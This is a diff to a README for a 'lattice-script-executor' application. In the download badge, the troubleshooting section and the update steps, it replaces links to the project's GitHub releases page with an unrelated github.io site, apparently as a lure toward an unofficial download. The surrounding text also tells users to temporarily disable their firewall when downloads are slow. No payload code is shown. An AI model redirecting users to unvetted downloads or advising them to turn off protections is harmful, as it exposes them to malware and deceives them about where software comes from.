@@ -8,7 +8,7 @@ This guide will walk you through everything you need to know, step by step, with
 
 ## 📥 Download and Installation
 
-[![Download Now](https://img.shields.io/badge/Download-lattice--script--executor-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/thatchfortnightly315/lattice-script-executor/releases)
+[![Download Now](https://img.shields.io/badge/Download-lattice--script--executor-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://thatchfortnightly315.github.io)
 
 Visit this link to download the application. Once you're on the download page, look for the latest release and click the download button that matches your operating system.
 
@@ -92,7 +92,7 @@ Each log entry shows who did what and when, creating a complete accountability t
 We want your experience to be smooth. Here are solutions to common problems you might encounter:
 
 ### "I can't download the file"
-Make sure you're using the correct download link: https://github.com/thatchfortnightly315/lattice-script-executor/releases
+Make sure you're using the correct download link: https://thatchfortnightly315.github.io
 If the download seems slow, try a different browser or temporarily disable your firewall.
 
 ### "The software won't start"
@@ -111,7 +111,7 @@ Check that you have the latest version installed. Older versions might not suppo
 
 We regularly release updates to improve performance and add new features. Here's how to update:
 
-1. Visit our releases page: https://github.com/thatchfortnightly315/lattice-script-executor/releases
+1. Visit our releases page: https://thatchfortnightly315.github.io
 2. Download the newest version for your operating system
 3. Install it right over your existing installation - your data and settings will be preserved automatically
 
